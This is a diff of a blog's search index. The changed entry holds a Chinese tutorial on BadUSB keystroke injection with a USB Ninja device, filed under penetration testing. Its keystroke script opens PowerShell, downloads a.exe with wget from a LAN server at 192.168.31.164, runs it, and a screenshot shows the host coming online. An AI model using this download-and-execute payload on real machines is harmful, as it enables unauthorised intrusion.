@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>物理黑客之BadUSB——物理渗透</title>
-    <url>/2023/07/19/USB%20Ninja%E4%BD%BF%E7%94%A8/</url>
+    <title>UsbNinja 物理黑客</title>
+    <url>/2019/04/24/USB%20Ninja%E4%BD%BF%E7%94%A8/</url>
     <content><![CDATA[<h1 id="什么是BadUsb"><a href="#什么是BadUsb" class="headerlink" title="什么是BadUsb"></a>什么是BadUsb</h1><p>其实最根本的原理就是模拟了键盘输入，利用了一个键盘控制芯片<br>因为可以接触到目标计算机了，因此直接插入目标计算机，让人防不胜防</p>
 <h1 id="UsbNinja"><a href="#UsbNinja" class="headerlink" title="UsbNinja"></a>UsbNinja</h1><h2 id="图片展示"><a href="#图片展示" class="headerlink" title="图片展示"></a>图片展示</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/jpeg/26110731/1680336308287-aa6c12f5-ddb1-495c-ba1c-261c0738df15.jpeg#averageHue=%23383933&clientId=uca5575ce-27d6-4&from=paste&height=405&id=u8834ebde&originHeight=1280&originWidth=1280&originalType=binary&ratio=1&rotation=0&showTitle=false&size=87413&status=done&style=none&taskId=u90906851-a149-44a1-94f7-4dd9b305fc4&title=&width=405" alt="41d9b94b22f53736bab43fce970b630.jpg"></p>
 <h2 id="操作原理"><a href="#操作原理" class="headerlink" title="操作原理"></a>操作原理</h2><p>3代USB ninja 拥有了蓝牙功能，如果资金不够，可以不买遥控器，直接使用手机蓝牙控制<br><code>[USBNinjaProfessional](https://github.com/USBNinjaRRG/USBNinjaProfessional)</code><br>手机控制apk下载链接 <a href="https://github.com/USBNinjaRRG/USBNinjaProfessional">https://github.com/USBNinjaRRG/USBNinjaProfessional</a><br>苹果直接在Apple Store中下载即可</p>
@@ -18,5 +18,11 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gui d</span><br><span class="line">Delay 500</span><br><span class="line">gui r</span><br><span class="line">delay 500</span><br><span class="line">string powershell</span><br><span class="line">delay 500</span><br><span class="line">enter</span><br><span class="line">Delay 500</span><br><span class="line">String cd desktop</span><br><span class="line">Enter</span><br><span class="line">Delay 500</span><br><span class="line">String wget http://192.168.31.164:8000/a.exe -o a.exe</span><br><span class="line">Delay 1000</span><br><span class="line">Enter</span><br><span class="line">String .\a.exe</span><br><span class="line">Delay 500</span><br><span class="line">Enter </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <h2 id="3-上线主机"><a href="#3-上线主机" class="headerlink" title="3.上线主机"></a>3.上线主机</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1680340105733-046e2838-52e8-43ec-9e67-7ba33d993c2a.png#averageHue=%23efe6d1&clientId=ufafc7408-2615-4&from=paste&height=918&id=u8dae9655&originHeight=918&originWidth=1918&originalType=binary&ratio=1&rotation=0&showTitle=false&size=656969&status=done&style=none&taskId=u32055085-57ff-4d03-8d67-15305e34e43&title=&width=1918" alt="image.png"></p>
 ]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>物理渗透</tag>
+      </tags>
   </entry>
 </search>
